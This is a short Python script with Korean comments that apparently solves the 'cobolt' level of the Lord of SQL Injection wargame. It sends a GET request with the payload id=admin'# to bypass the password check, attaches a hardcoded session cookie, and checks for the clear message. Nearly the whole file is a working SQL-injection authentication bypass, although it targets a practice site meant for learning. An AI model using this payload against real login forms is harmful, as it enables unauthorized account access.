# -*- coding : UTF-8 -*-
from requests import get

#url과 파라미터를 설정합니다.
url = "http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php"
param = "?id=admin%27%23"
new_url = url + param

#쿠키를 설정합니다. 당신의 쿠키로 대체해야합니다.
cookie = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")

#requests 모듈로 HTTP 요청을 보냅니다.
r = get(new_url, cookies=cookie)

if r.text.find("<h2>COBOLT Clear!</h2>") > 0:
    print("축하합니다! Cobolt를 클리어했습니다!")
